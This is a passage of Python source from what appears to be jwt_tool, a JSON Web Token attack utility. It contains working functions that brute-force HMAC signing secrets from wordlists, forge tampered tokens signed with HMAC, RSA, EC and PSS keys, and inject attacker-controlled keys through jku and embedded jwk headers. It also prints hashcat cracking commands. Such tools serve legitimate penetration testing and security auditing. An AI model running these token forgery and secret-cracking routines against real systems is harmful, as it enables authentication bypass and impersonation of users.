Signing:\"\n        jwtOut(newContents+\".\"+newSig, \"Manual Tamper - HMAC Signing\", desc)\n    elif config['argvals']['sigType'][0:2] == \"rs\":\n        newSig, newContents = signTokenRSA(newheadDict, newpaylDict, config['crypto']['privkey'], int(config['argvals']['sigType'][2:]))\n        desc = \"Tampered token - RSA Signing:\"\n        jwtOut(newContents+\".\"+newSig, \"Manual Tamper - RSA Signing\", desc)\n    elif config['argvals']['sigType'][0:2] == \"es\":\n        newSig, newContents = signTokenEC(newheadDict, newpaylDict, config['crypto']['ecprivkey'], int(config['argvals']['sigType'][2:]))\n        desc = \"Tampered token - EC Signing:\"\n        jwtOut(newContents+\".\"+newSig, \"Manual Tamper - EC Signing\", desc)\n    elif config['argvals']['sigType'][0:2] == \"ps\":\n        newSig, newContents = signTokenPSS(newheadDict, newpaylDict, config['crypto']['privkey'], int(config['argvals']['sigType'][2:]))\n        desc = \"Tampered token - PSS RSA Signing:\"\n        jwtOut(newContents+\".\"+newSig, \"Manual Tamper - PSS RSA Signing\", desc)\n\ndef checkSig(sig, contents, key):\n    quiet = False\n    if key == \"\":\n        cprintc(\"Type in the key to test\", \"white\")\n        key = input(\"> \")\n    testKey(key.encode(), sig, contents, headDict, quiet)\n\ndef checkSigKid(sig, contents):\n    quiet = False\n    cprintc(\"\\nLoading key file...\", \"cyan\")\n    try:\n        key1 = open(config['argvals']['keyFile']).read()\n        cprintc(\"File loaded: \"+config['argvals']['keyFile'], \"cyan\")\n        testKey(key1.encode(), sig, contents, headDict, quiet)\n    except:\n        cprintc(\"Could not load key file\", \"red\")\n        exit(1)\n\ndef crackSig(sig, contents):\n    quiet = True\n    if headDict[\"alg\"][0:2] != \"HS\":\n        cprintc(\"Algorithm is not HMAC-SHA - cannot test against passwords, try the Verify function.\", \"red\")\n        return\n    # print(\"\\nLoading key dictionary...\")\n    try:\n        # cprintc(\"File loaded: \"+config['argvals']['keyList'], \"cyan\")\n        keyLst = open(config['argvals']['keyList'], \"r\", encoding='utf-8', errors='ignore')\n        nextKey = keyLst.readline()\n    except:\n        cprintc(\"No dictionary file loaded\", \"red\")\n        exit(1)\n    # print(\"Testing passwords in dictionary...\")\n    utf8errors = 0\n    wordcount = 0\n    while nextKey:\n        wordcount += 1\n        try:\n            cracked = testKey(nextKey.strip().encode('UTF-8'), sig, contents, headDict, quiet)\n        except:\n            cracked = False\n        if not cracked:\n            if wordcount % 1000000 == 0:\n                cprintc(\"[*] Tested \"+str(int(wordcount/1000000))+\" million passwords so far\", \"cyan\")\n            try:\n                nextKey = keyLst.readline()\n            except:\n                utf8errors  += 1\n                nextKey = keyLst.readline()\n        else:\n            return\n    if cracked == False:\n        cprintc(\"[-] Key not in dictionary\", \"red\")\n        if not args.mode:\n            cprintc(\"\\n===============================\\nAs your list wasn't able to crack this token you might be better off using longer dictionaries, custom dictionaries, mangling rules, or brute force attacks.\\nhashcat (https://hashcat.net/hashcat/) is ideal for this as it is highly optimised for speed. Just add your JWT to a text file, then use the following syntax to give you a good start:\\n\\n[*] dictionary attacks: hashcat -a 0 -m 16500 jwt.txt passlist.txt\\n[*] rule-based attack:  hashcat -a 0 -m 16500 jwt.txt passlist.txt -r rules/best64.rule\\n[*] brute-force attack: hashcat -a 3 -m 16500 jwt.txt ?u?l?l?l?l?l?l?l -i --increment-min=6\\n===============================\\n\", \"cyan\")\n    if utf8errors > 0:\n        cprintc(utf8errors, \" UTF-8 incompatible passwords skipped\", \"cyan\")\n\ndef castInput(newInput):\n    if \"{\" in str(newInput):\n        try:\n            jsonInput = json.loads(newInput)\n            return jsonInput\n        except ValueError:\n            pass\n    if \"\\\"\" in str(newInput):\n        return newInput.strip(\"\\\"\")\n    elif newInput == \"True\" or newInput == \"true\":\n        return True\n    elif newInput == \"False\" or newInput == \"false\":\n        return False\n    elif newInput == \"null\":\n        return None\n    else:\n        try:\n            numInput = float(newInput)\n            try:\n                intInput = int(newInput)\n                return intInput\n            except:\n                return numInput\n        except:\n            return str(newInput)\n    return newInput\n\ndef buildSubclaim(newVal, claimList, selection):\n    while True:\n        subList = [0]\n        s = 0\n        for subclaim in newVal:\n            subNum = s+1\n            cprintc(\"[\"+str(subNum)+\"] \"+subclaim+\" = \"+str(newVal[subclaim]), \"white\")\n            s += 1\n            subList.append(subclaim)\n        cprintc(\"[\"+str(s+1)+\"] *ADD A VALUE*\", \"white\")\n        cprintc(\"[\"+str(s+2)+\"] *DELETE A VALUE*\", \"white\")\n        cprintc(\"[0] Continue to next step\", \"white\")\n        try:\n            subSel = int(input(\"> \"))\n        except:\n            cprintc(\"Invalid selection\", \"red\")\n            exit(1)\n        if subSel<=len(newVal) and subSel>0:\n            selClaim = subList[subSel]\n            cprintc(\"\\nCurrent value of \"+selClaim+\" is: \"+str(newVal[selClaim]), \"white\")\n            cprintc(\"Please enter new value and hit ENTER\", \"white\")\n            newVal[selClaim] = castInput(input(\"> \"))\n            cprintc(\"\", \"white\")\n        elif subSel == s+1:\n            cprintc(\"Please enter new Key and hit ENTER\", \"white\")\n            newPair = input(\"> \")\n            cprintc(\"Please enter new value for \"+newPair+\" and hit ENTER\", \"white\")\n            newVal[newPair] = castInput(input(\"> \"))\n        elif subSel == s+2:\n            cprintc(\"Please select a Key to DELETE and hit ENTER\", \"white\")\n            s = 0\n            for subclaim in newVal:\n                subNum = s+1\n                cprintc(\"[\"+str(subNum)+\"] \"+subclaim+\" = \"+str(newVal[subclaim]), \"white\")\n                subList.append(subclaim)\n                s += 1\n            try:\n                selSub = int(input(\"> \"))\n            except:\n                cprintc(\"Invalid selection\", \"red\")\n                exit(1)\n            delSub = subList[selSub]\n            del newVal[delSub]\n        elif subSel == 0:\n            return newVal\n\ndef testKey(key, sig, contents, headDict, quiet):\n    if headDict[\"alg\"] == \"HS256\":\n        testSig = base64.urlsafe_b64encode(hmac.new(key,contents,hashlib.sha256).digest()).decode('UTF-8').strip(\"=\")\n    elif headDict[\"alg\"] == \"HS384\":\n        testSig = base64.urlsafe_b64encode(hmac.new(key,contents,hashlib.sha384).digest()).decode('UTF-8').strip(\"=\")\n    elif headDict[\"alg\"] == \"HS512\":\n        testSig = base64.urlsafe_b64encode(hmac.new(key,contents,hashlib.sha512).digest()).decode('UTF-8').strip(\"=\")\n    else:\n        cprintc(\"Algorithm is not HMAC-SHA - cannot test with this tool.\", \"red\")\n        exit(1)\n    if testSig == sig:\n        cracked = True\n        if len(key) > 25:\n            cprintc(\"[+] CORRECT key found:\\n\"+key.decode('UTF-8'), \"green\")\n        else:\n            cprintc(\"[+] \"+key.decode('UTF-8')+\" is the CORRECT key!\", \"green\")\n        cprintc(\"You can tamper/fuzz the token contents (-T/-I) and sign it using:\\npython3 jwt_tool.py [options here] -S \"+str(headDict[\"alg\"]).lower()+\" -p \\\"\"+key.decode('UTF-8')+\"\\\"\", \"cyan\")\n        return cracked\n    else:\n        cracked = False\n        if quiet == False:\n            if len(key) > 25:\n                cprintc(\"[-] \"+key[0:25].decode('UTF-8')+\"...(output trimmed) is not the correct key\", \"red\")\n            else:\n                cprintc(\"[-] \"+key.decode('UTF-8')+\" is not the correct key\", \"red\")\n        return cracked\n\ndef getRSAKeyPair():\n    #config['crypto']['pubkey'] = config['crypto']['pubkey']\n    privkey = config['crypto']['privkey']\n    cprintc(\"key: \"+privkey, \"cyan\")\n    privKey = RSA.importKey(open(privkey).read())\n    pubKey = privKey.publickey().exportKey(\"PEM\")\n    #config['crypto']['pubkey'] = RSA.importKey(config['crypto']['pubkey'])\n    return pubKey, privKey\n\ndef newRSAKeyPair():\n    new_key = RSA.generate(2048, e=65537)\n    pubKey = new_key.publickey().exportKey(\"PEM\")\n    privKey = new_key.exportKey(\"PEM\")\n    return pubKey, privKey\n\ndef newECKeyPair():\n    new_key = ECC.generate(curve='P-256')\n    pubkey = new_key.public_key().export_key(format=\"PEM\")\n    privKey = new_key.export_key(format=\"PEM\")\n    return pubkey, privKey\n\ndef signTokenHS(headDict, paylDict, key, hashLength):\n    newHead = headDict\n    newHead[\"alg\"] = \"HS\"+str(hashLength)\n    if hashLength == 384:\n        newContents = genContents(newHead, paylDict)\n        newSig = base64.urlsafe_b64encode(hmac.new(key.encode(),newContents.encode(),hashlib.sha384).digest()).decode('UTF-8').strip(\"=\")\n    elif hashLength == 512:\n        newContents = genContents(newHead, paylDict)\n        newSig = base64.urlsafe_b64encode(hmac.new(key.encode(),newContents.encode(),hashlib.sha512).digest()).decode('UTF-8').strip(\"=\")\n    else:\n        newContents = genContents(newHead, paylDict)\n        newSig = base64.urlsafe_b64encode(hmac.new(key.encode(),newContents.encode(),hashlib.sha256).digest()).decode('UTF-8').strip(\"=\")\n    return newSig, newContents\n\ndef buildJWKS(n, e, kid):\n    newjwks = {}\n    newjwks[\"kty\"] = \"RSA\"\n    newjwks[\"kid\"] = kid\n    newjwks[\"use\"] = \"sig\"\n    newjwks[\"e\"] = str(e.decode('UTF-8'))\n    newjwks[\"n\"] = str(n.decode('UTF-8').rstrip(\"=\"))\n    return newjwks\n\ndef jwksGen(headDict, paylDict, jku, privKey, kid=\"jwt_tool\"):\n    newHead = headDict\n    nowtime = str(int(datetime.now().timestamp()))\n    key = RSA.importKey(open(config['crypto']['privkey']).read())\n    pubKey = key.publickey().exportKey(\"PEM\")\n    privKey = key.export_key(format=\"PEM\")\n    new_key = RSA.importKey(pubKey)\n    n = base64.urlsafe_b64encode(new_key.n.to_bytes(256, byteorder='big'))\n    e = base64.urlsafe_b64encode(new_key.e.to_bytes(3, byteorder='big'))\n    privKeyName = config['crypto']['privkey']\n    newjwks = buildJWKS(n, e, kid)\n    newHead[\"jku\"] = jku\n    newHead[\"alg\"] = \"RS256\"\n    key = RSA.importKey(privKey)\n    newContents = genContents(newHead, paylDict)\n    newContents = newContents.encode('UTF-8')\n    h = SHA256.new(newContents)\n    signer = PKCS1_v1_5.new(key)\n    try:\n        signature = signer.sign(h)\n    except:\n        cprintc(\"Invalid Private Key\", \"red\")\n        exit(1)\n    newSig = base64.urlsafe_b64encode(signature).decode('UTF-8').strip(\"=\")\n    jwksout = json.dumps(newjwks,separators=(\",\",\":\"), indent=4)\n    jwksbuild = {\"keys\": []}\n    jwksbuild[\"keys\"].append(newjwks)\n    fulljwks = json.dumps(jwksbuild,separators=(\",\",\":\"), indent=4)\n    if config['crypto']['jwks'] == \"\":\n        jwksName = \"jwks_jwttool_RSA_\"+nowtime+\".json\"\n        with open(jwksName, 'w') as test_jwks_out:\n                test_jwks_out.write(fulljwks)\n    else:\n        jwksName = config['crypto']['jwks']\n    return newSig, newContents.decode('UTF-8'), jwksout, privKeyName, jwksName, fulljwks\n\ndef jwksEmbed(newheadDict, newpaylDict):\n    newHead = newheadDict\n    pubKey, privKey = getRSAKeyPair()\n    new_key = RSA.importKey(pubKey)\n    n = base64.urlsafe_b64encode(new_key.n.to_bytes(256, byteorder='big'))\n    e = base64.urlsafe_b64encode(new_key.e.to_bytes(3, byteorder='big'))\n    newjwks = buildJWKS(n, e, config['customising']['jwks_kid'])\n    newHead[\"jwk\"] = newjwks\n    newHead[\"alg\"] = \"RS256\"\n    key = privKey\n    # key = RSA.importKey(privKey)\n    newContents = genContents(newHead, newpaylDict)\n    newContents = newContents.encode('UTF-8')\n    h = SHA256.new(newContents)\n    signer = PKCS1_v1_5.new(key)\n    try:\n        signature = signer.sign(h)\n    except:\n        cprintc(\"Invalid Private Key\", \"red\")\n        exit(1)\n    newSig = base64.urlsafe_b64encode(signature).decode('UTF-8').strip(\"=\")\n    return newSig, newContents.decode('UTF-8')\n\ndef signTokenRSA(headDict, paylDict, privKey, hashLength):\n    newHead = headDict\n    newHead[\"alg\"] = \"RS\"+str(hashLength)\n    key = RSA.importKey(open(config['crypto']['privkey']).read())\n    newContents = genContents(newHead, paylDict)\n    newContents = newContents.encode('UTF-8')\n    if hashLength == 256:\n        h = SHA256.new(newContents)\n    elif hashLength == 384:\n        h = SHA384.new(newContents)\n    elif hashLength == 512:\n        h = SHA512.new(newContents)\n    else:\n        cprintc(\"Invalid RSA hash length\", \"red\")\n        exit(1)\n    signer = PKCS1_v1_5.new(key)\n    try:\n        signature = signer.sign(h)\n    except:\n        cprintc(\"Invalid Private Key\", \"red\")\n        exit(1)\n    newSig = base64.urlsafe_b64encode(signature).decode('UTF-8').strip(\"=\")\n    return newSig, newContents.decode('UTF-8')\n\ndef signTokenEC(headDict, paylDict, privKey, hashLength):\n    newHead = headDict\n    newHead[\"alg\"] = \"ES\"+str(hashLength)\n    key = ECC.import_key(open(config['crypto']['ecprivkey']).read())\n    newContents = genContents(newHead, paylDict)\n    newContents = newContents.encode('UTF-8')\n    if hashLength == 256:\n        h = SHA256.new(newContents)\n    elif hashLength == 384:\n        h = SHA384.new(newContents)\n    elif hashLength == 512:\n        h = SHA512.new(newContents)\n    else:\n        cprintc(\"Invalid hash length\", \"red\")\n        exit(1)\n    signer = DSS.new(key, 'fips-186-3')\n    try:\n        signature = signer.sign(h)\n    except:\n        cprintc(\"Invalid Private Key\", \"red\")\n        exit(1)\n    newSig = base64.urlsafe_b64encode(signature).decode('UTF-8').strip(\"=\")\n    return newSig, newContents.decode('UTF-8')\n\ndef signTokenPSS(headDict, paylDict, privKey, hashLength):\n    newHead = headDict\n    newHead[\"alg\"] = \"PS\"+str(hashLength)\n    key = RSA.importKey(open(config['crypto']['privkey']).read())\n    newContents = genContents(newHead, paylDict)\n    newContents = newContents.encode('UTF-8')\n    if hashLength == 256:\n        h = SHA256.new(newContents)\n    elif hashLength == 384:\n        h = SHA384.new(newContents)\n    elif hashLength == 512:\n        h = SHA512.new(newContents)\n    else:\n        cprintc(\"Invalid RSA hash length\", \"red\")\n        exit(1)\n    try:\n        signature = pss.new(key).sign(h)\n    except:\n        cprintc(\"Invalid Private Key\", \"red\")\n        exit(1)\n    newSig = base64.urlsafe_b64encode(signature).decode('UTF-8').strip(\"=\")\n    return newSig, newContents.decode('UTF-8')\n\ndef verifyTokenRSA(headDict, paylDict, sig, pubKey):\n    key = RSA.importKey(open(pubKey).read())\n    newContents = genContents(headDict, paylDict)\n    newContents = newContents.encode('UTF-8')\n    if \"-\" in sig:\n        try:\n            sig = base64.urlsafe_b64decode(sig)\n        except:\n            pass\n        try:\n            sig = base64.urlsafe_b64decode(sig+\"=\")\n        except:\n            pass\n        try:\n            sig = base64.urlsafe_b64decode(sig+\"==\")\n        except:\n            pass\n    elif \"+\" in sig:\n        try:\n            sig = base64.b64decode(sig)\n        except:\n            pass\n        try:\n            sig = base64.b64decode(sig+\"=\")\n        except:\n            pass\n        try:\n            sig = base64.b64decode(sig+\"==\")\n        except:\n            pass\n    else:\n        cprintc(\"Signature not Base64 encoded HEX\", \"red\")\n    if headDict['alg'] == \"RS256\":\n        h = SHA256.new(newContents)\n    elif headDict['alg'] == \"RS384\":\n        h = SHA384.new(newContents)\n    elif headDict['alg'] == \"RS512\":\n        h = SHA512.new(newContents)\n    else:\n        cprintc(\"Invalid RSA algorithm\", \"red\")\n    verifier = PKCS1_v1_5.new(key)\n    try:\n        valid = verifier.verify(h, sig)\n        if valid:\n            cprintc(\"RSA Signature is VALID\", \"green\")\n            valid = True\n        else:\n            cprintc(\"RSA Signature is INVALID\", \"red\")\n            valid = False\n    except:\n        cprintc(\"The Public Key is invalid\", \"red\")\n    return valid\n\ndef verifyTokenEC(headDict, paylDict, sig, pubKey):\n    newContents = genContents(headDict, paylDict)\n    message = newContents.encode('UTF-8')\n    if \"-\" in str(sig):\n        try:\n            signature = base64.urlsafe_b64decode(sig)\n        except:\n            pass\n        try:\n            signature = base64.urlsafe_b64decode(sig+\"=\")\n        except:\n            pass\n        try:\n            signature = base64.urlsafe_b64decode(sig+\"==\")\n        except:\n            pass\n    elif \"+\" in str(sig):\n        try:\n            signature = base64.b64decode(sig)\n        except:\n            pass\n        try:\n            signature = base64.b64decode(sig+\"=\")\n        except:\n            pass\n        try:\n            signature = base64.b64decode(sig+\"==\")\n        except:\n            pass\n    else:\n        cprintc(\"Signature not Base64 encoded HEX\", \"red\")\n    if headDict['alg'] == \"ES256\":\n        h = SHA256.new(message)\n    elif headDict['alg'] == \"ES384\":\n        h = SHA384.new(message)\n    elif headDict['alg'] == \"ES512\":\n        h = SHA512.new(message)\n    else:\n        cprintc(\"Invalid ECDSA algorithm\", \"red\")\n    pubkey = open(pubKey, \"r\")\n    pub_key = ECC.import_key(pubkey.read())\n    verifier = DSS.new(pub_key, 'fips-186-3')\n    try:\n        verifier.verify(h, signature)\n        cprintc(\"ECC Signature is VALID\", \"green\")\n        valid = True\n    except:\n        cprintc(\"ECC Signature is INVALID\", \"red\")\n        valid = False\n    return valid\n\ndef verifyTokenPSS(headDict, paylDict, sig, pubKey):\n    key = RSA.importKey(open(pubKey).read())\n    newContents = genContents(headDict, paylDict)\n    newContents = newContents.encode('UTF-8')\n    if \"-\" in sig:\n        try:\n            sig = base64.urlsafe_b64decode(sig)\n        except:\n            pass\n        try:\n            sig = base64.urlsafe_b64decode(sig+\"=\")\n        except:\n            pass\n        try:\n            sig = base64.urlsafe_b64decode(sig+\"==\")\n        except:\n            pass\n    elif \"+\" in sig:\n        try:\n            sig = base64.b64decode(sig)\n        except:\n            pass\n        try:\n            sig = base64.b64decode(sig+\"=\")\n        except:\n            pass\n        try:\n            sig = base64.b64decode(sig+\"==\")\n        except:\n            pass\n    else:\n        cprintc(\"Signature not Base64 encoded HEX\", \"red\")\n    if headDict['alg'] == \"PS256\":\n        h = SHA256.new(newContents)\n    elif headDict['alg'] == \"PS384\":\n        h = SHA384.new(newContents)\n    elif headDict['alg'] == \"PS512\":\n        h = SHA512.new(newContents)\n    else:\n        cprintc(\"Invalid RSA algorithm\", \"red\")\n    verifier = pss.new(key)\n    try:\n        valid = verifier.verify(h, sig)\n        cprintc(\"RSA-PSS Signature is VALID\", \"green\")\n        valid = True\n    except:\n        cprintc(\"RSA-PSS Signature is INVALID\", \"red\")\n        valid = False\n    return valid\n\ndef exportJWKS(jku):\n    try:\n        kid = headDict[\"kid\"]\n        newSig, newContents, newjwks, privKeyName, jwksName, fulljwks = jwksGen(headDict, paylDict, jku, config['crypto']['privkey'], kid)\n    except:\n        kid = \"\"\n        newSig, newContents, newjwks, privKeyName, jwksName, fulljwks = jwksGen(headDict, paylDict, jku, config['crypto']['privkey'])\n    return newContents, newSig\n\ndef parseJWKS(jwksfile):\n    jwks = open(jwksfile, \"r\").read()\n    jwksDict = json.loads(jwks, object_pairs_hook=OrderedDict)\n    nowtime = int(datetime.now().timestamp())\n    cprintc(\"JWKS Contents:\", \"cyan\")\n    try:\n        keyLen = len(jwksDict[\"keys\"])\n        cprintc(\"Number of keys: \"+str(keyLen), \"cyan\")\n        i = -1\n        for jkey in range(0,keyLen):\n            i += 1\n            cprintc(\"\\n--------\", \"white\")\n            try:\n                cprintc(\"Key \"+str(i+1), \"cyan\")\n                kid = str(jwksDict[\"keys\"][i][\"kid\"])\n                cprintc(\"kid: \"+kid, \"cyan\")\n            except:\n                kid = i\n                cprintc(\"Key \"+str(i+1), \"cyan\")\n            for keyVal in jwksDict[\"keys\"][i].items():\n                keyVal = keyVal[0]\n                cprintc(\"[+] \"+keyVal+\" = \"+str(jwksDict[\"keys\"][i][keyVal]), \"green\")\n            try:\n                x = str(jwksDict[\"keys\"][i][\"x\"])\n                y = str(jwksDict[\"keys\"][i][\"y\"])\n                cprintc(\"\\nFound ECC key factors, generating a public key\", \"cyan\")\n                pubkeyName = genECPubFromJWKS(x, y, kid, nowtime)\n                cprintc(\"[+] \"+pubkeyName, \"green\")\n                cprintc(\"\\nAttempting to verify token using \"+pubkeyName, \"cyan\")\n                valid = verifyTokenEC(headDict, paylDict, sig, pubkeyName)\n            except:\n                pass\n            try:\n                n = str(jwksDict[\"keys\"][i][\"n\"])\n                e = str(jwksDict[\"keys\"][i][\"e\"])\n                cprintc(\"\\nFound RSA key factors, generating a public key\", \"cyan\")\n                pubkeyName = genRSAPubFromJWKS(n, e, kid, nowtime)\n                cprintc(\"[+] \"+pubkeyName, \"green\")\n                cprintc(\"\\nAttempting to verify token using \"+pubkeyName, \"cyan\")\n                valid = verifyTokenRSA(headDict, paylDict, sig, pubkeyName)\n            except:\n                pass\n    except:\n        cprintc(\"Single key file\", \"white\")\n        for jkey in jwksDict:\n            cprintc(\"[+] \"+jkey+\" = \"+str(jwksDict[jkey]), \"green\")\n        try:\n            kid = 1\n            x = str(jwksDict[\"x\"])\n            y = str(jwksDict[\"y\"])\n            cprintc(\"\\nFound ECC key factors, generating a public key\", \"cyan\")\n            pubkeyName = genECPubFromJWKS(x, y, kid, nowtime)\n            cprintc(\"[+] \"+pubkeyName, \"green\")\n            cprintc(\"\\nAttempting to verify token using \"+pubkeyName, \"cyan\")\n            valid = verifyTokenEC(headDict, paylDict, sig, pubkeyName)\n        except:\n            pass\n        try:\n            kid = 1\n            n = str(jwksDict[\"n\"])\n            e = str(jwksDict[\"e\"])\n            cprintc(\"\\nFound RSA key factors, generating a public key\", \"cyan\")\n            pubkeyName = genRSAPubFromJWKS(n, e, kid, nowtime)\n            cprintc(\"[+] \"+pubkeyName, \"green\")\n            cprintc(\"\\nAttempting to verify token using \"+pubkeyName, \"cyan\")\n            valid = verifyTokenRSA(headDict, paylDict, sig, pubkeyName)\n        except:\n            pass\n\ndef genECPubFromJWKS(x, y, kid, nowtime):\n    try:\n        x = int.from_bytes(base64.urlsafe_b64decode(x), byteorder='big')\n    except:\n        pass\n    try:\n        x = int.from_bytes(base64.urlsafe_b64decode(x+\"=\"), byteorder='big')\n    except:\n        pass\n    try:\n        x = int.from_bytes(base64.urlsafe_b64decode(x+\"==\"), byteorder='big')\n    except:\n        pass\n    try:\n        y = int.from_bytes(base64.urlsafe_b64decode(y), byteorder='big')\n    except:\n        pass\n    try:\n        y = int.from_bytes(base64.urlsafe_b64decode(y+\"=\"), byteorder='big')\n    except:\n        pass\n    try:\n        y = int.from_bytes(base64.urlsafe_b64decode(y+\"==\"), byteorder='big')\n    except:\n        pass\n    new_key = ECC.construct(curve='P-256', point_x=x, point_y=y)\n    pubKey = new_key.public_key().export_key(format=\"PEM\")+\"\\n\"\n    pubkeyName = \"kid_\"+str(kid)+\"_\"+str(nowtime)+\".pem\"\n    with open(pubkeyName, 'w') as test_pub_out:\n        test_pub_out.write(pubKey)\n    return pubkeyName\n\ndef genRSAPubFromJWKS(n, e, kid, nowtime):\n    try:\n        n = int.from_bytes(base64.urlsafe_b64decode(n), byteorder='big')\n    except:\n        pass\n    try:\n        n = int.from_bytes(base64.urlsafe_b64decode(n+\"=\"), byteorder='big')\n    except:\n        pass\n    try:\n        n = int.from_bytes(base64.urlsafe_b64decode(n+\"==\"), byteorder='big')\n    except:\n        pass\n    try:\n        e = int.from_bytes(base64.urlsafe_b64decode(e), byteorder='big')\n    except:\n        pass\n    try:\n        e = int.from_bytes(base64.urlsafe_b64decode(e+\"=\"), byteorder='big')\n    except:\n        pass\n    try:\n        e = int.from_bytes(base64.urlsafe_b64decode(e+\"==\"), byteorder='big')\n    except:\n        pass\n    new_key = RSA.construct((n, e))\n    pubKey = new_key.publickey().exportKey(format=\"PEM\")\n    pubkeyName = \"kid_\"+str(kid)+\"_\"+str(nowtime)+\".pem\"\n    with open(pubkeyName, 'w') as test_pub_out:\n        test_pub_out.write(pubKey.decode()+\"\\n\")\n    return pubkeyName\n\ndef getVal(promptString):\n    newVal = input(promptString)\n    try:\n        newVal = json.loads(newVal)\n    except ValueError:\n        try:\n            newVal = json.loads(newVal.replace(\"'\", '\"'))\n        except ValueError:\n            pass\n    return newVal\n\ndef genContents(headDict, paylDict, newContents=\"\"):\n    if paylDict == {}:\n        newContents = base64.urlsafe_b64encode(json.dumps(headDict,separators=(\",\",\":\")).encode()).decode('UTF-8').strip(\"=\")+\".\"\n    else:\n        newContents = base64.urlsafe_b64encode(json.dumps(headDict,separators=(\",\",\":\")).encode()).decode('UTF-8').strip(\"=\")+\".\"+base64.urlsafe_b64encode(json.dumps(paylDict,separators=(\",\",\":\")).encode()).decode('UTF-8').strip(\"=\")\n    return newContents.encode().decode('UTF-8')\n\ndef dissectPayl(paylDict, count=False):\n    timeseen = 0\n    comparestamps = []\n    countval = 0\n    expiredtoken = False\n    nowtime = int(datetime.now().timestamp())\n    for claim in paylDict:\n        countval += 1\n        if count:\n            placeholder = str(countval)\n        else:\n            placeholder = \"+\"\n        if claim in [\"exp\", \"nbf\", \"iat\"]:\n            timestamp = datetime.fromtimestamp(int(paylDict[claim]))\n            if claim == \"exp\":\n                if int(timestamp.timestamp()) < nowtime:\n                    expiredtoken = True\n            cprintc(\"[\"+placeholder+\"] \"+claim+\" = \"+str(paylDict[claim])+\"    ==> TIMESTAMP = \"+timestamp.strftime('%Y-%m-%d %H:%M:%S')+\" (UTC)\", \"green\")\n            timeseen += 1\n            comparestamps.append(claim)\n        elif isinstance(paylDict[claim], dict):\n                cprintc(\"[\"+placeholder+\"] \"+claim+\" = JSON object:\", \"green\")\n                for subclaim in paylDict[claim]:\n                    if type(castInput(paylDict[claim][subclaim])) == str:\n                        cprintc(\"    [+] \"+subclaim+\" = \\\"\"+str(paylDict[claim][subclaim])+\"\\\"\", \"green\")\n                    elif paylDict[claim][subclaim] == None:\n                        cprintc(\"    [+] \"+subclaim+\" = null\", \"green\")\n                    elif paylDict[claim][subclaim] == True and not paylDict[claim][subclaim] == 1:\n                        cprintc(\"    [+] \"+subclaim+\" = true\", \"green\")\n                    elif paylDict[claim][subclaim] == False and not paylDict[claim][subclaim] == 0:\n                        cprintc(\"    [+] \"+subclaim+\" = false\", \"green\")\n                    else:\n                        cprintc(\"    [+] \"+subclaim+\" = \"+str(paylDict[claim][subclaim]), \"green\")\n        else:\n            if type(paylDict[claim]) == str:\n                cprintc(\"[\"+placeholder+\"] \"+claim+\" = \\\"\"+str(paylDict[claim])+\"\\\"\", \"green\")\n            else:\n                cprintc(\"[\"+placeholder+\"] \"+claim+\" = \"+str(paylDict[claim]), \"green\")\n    return comparestamps, expiredtoken\n\ndef validateToken(jwt):\n    try:\n        headB64, paylB64, sig = jwt.split(\".\",3)\n    except:\n        cprintc(\"[-] Invalid token:\\nNot 3 parts -> header.payload.signature\", \"red\")\n        exit(1)\n    try:\n        sig = base64.urlsafe_b64encode(base64.urlsafe_b64decode(sig + \"=\" * (-len(sig) % 4))).decode('UTF-8').strip(\"=\")\n    except:\n        cprintc(\"[-] Invalid token:\\nCould not base64-decode SIGNATURE - incorrect formatting/invalid characters\", \"red\")\n        cprintc(\"----------------\", \"white\")\n        cprintc(headB64, \"cyan\")\n        cprintc(paylB64, \"cyan\")\n        cprintc(sig, \"red\")\n        exit(1)\n    contents = headB64+\".\"+paylB64\n    contents = contents.encode()\n    try:\n        head = base64.urlsafe_b64decode(headB64 + \"=\" * (-len(headB64) % 4))\n    except:\n        cprintc(\"[-] Invalid token:\\nCould not base64-decode HEADER - incorrect formatting/invalid characters\", \"red\")\n        cprintc(\"----------------\", \"white\")\n        cprintc(headB64, \"red\")\n        cprintc(paylB64, \"cyan\")\n        cprintc(sig, \"cyan\")\n        exit(1)\n    try:\n        payl = base64.urlsafe_b64decode(paylB64 + \"=\" * (-len(paylB64) % 4))\n    except:\n        cprintc(\"[-] Invalid token:\\nCould not base64-decode PAYLOAD - incorrect formatting/invalid characters\", \"red\")\n        cprintc(\"----------------\", \"white\")\n        cprintc(headB64, \"cyan\")\n        cprintc(paylB64, \"red\")\n        cprintc(sig, \"cyan\")\n        exit(1)\n    try:\n        headDict = json.loads(head, object_pairs_hook=OrderedDict)\n    except:\n        cprintc(\"[-] Invalid token:\\nHEADER not valid JSON format\", \"red\")\n\n        cprintc(head.decode('UTF-8'), \"red\")\n        exit(1)\n    if payl.decode() == \"\":\n        cprintc(\"Payload is blank\", \"white\")\n        paylDict = {}\n    else:\n        try:\n            paylDict = json.loads(payl, object_pairs_hook=OrderedDict)\n        except:\n            cprintc(\"[-] Invalid token:\\nPAYLOAD not valid JSON format\", \"red\")\n            cprintc(payl.decode('UTF-8'), \"red\")\n            exit(1)\n    if args.verbose:\n        cprintc(\"Token: \"+head.decode()+\".\"+payl.decode()+\".\"+sig+\"\\n\", \"green\")\n    return headDict, paylDict, sig, contents\n\ndef rejigToken(headDict, paylDict, sig):\n    cprintc(\"=====================\\nDecoded Token Values:\\n=====================\", \"white\")\n    cprintc(\"\\nToken header values:\", \"white\")\n    for claim in headDict:\n        if isinstance(headDict[claim], dict):\n            cprintc(\"[+] \"+claim+\" = JSON object:\", \"green\")\n            for subclaim in headDict[claim]:\n                if headDict[claim][subclaim] == None:\n                    cprintc(\"    [+] \"+subclaim+\" = null\", \"green\")\n                elif headDict[claim][subclaim] == True:\n                    cprintc(\"    [+] \"+subclaim+\" = true\", \"green\")\n                elif headDict[claim][subclaim] == False:\n                    cprintc(\"    [+] \"+subclaim+\" = false\", \"green\")\n                elif type(headDict[claim][subclaim]) == str:\n                    cprintc(\"    [+] \"+subclaim+\" = \\\"\"+str(headDict[claim][subclaim])+\"\\\"\", \"green\")\n                else:\n                    cprintc(\"    [+] \"+subclaim+\" = \"+str(headDict[claim][subclaim]), \"green\")\n        else:\n            if type(headDict[claim]) == str:\n                cprintc(\"[+] \"+claim+\" = \\\"\"+str(headDict[claim])+\"\\\"\", \"green\")\n            else:\n                cprintc(\"[+] \"+claim+\" = \"+str(headDict[claim]), \"green\")\n    cprintc(\"\\nToken payload values:\", \"white\")\n    comparestamps, expiredtoken = dissectPayl(paylDict)\n    if len(comparestamps) >= 2:\n        cprintc(\"\\nSeen timestamps:\", \"white\")\n        cprintc(\"[*] \"+comparestamps[0]+\" was seen\", \"green\")\n        claimnum = 0\n        for claim in comparestamps:\n            timeoff = 